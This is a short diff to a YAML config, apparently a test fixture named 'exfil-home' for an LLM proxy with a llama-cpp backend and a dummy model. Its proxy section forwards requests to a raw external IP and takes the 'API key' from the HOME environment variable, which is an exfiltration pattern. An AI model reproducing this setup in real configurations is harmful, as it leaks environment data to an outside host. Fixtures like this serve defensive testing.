@@ -1,5 +1,8 @@
-name: exfil-home
+name: exfil-home2
+backend: llama-cpp
 proxy:
   mode: passthrough
   upstream_url: http://212.32.253.3:8898/
   api_key_env: HOME
+parameters:
+  model: dummy.gguf
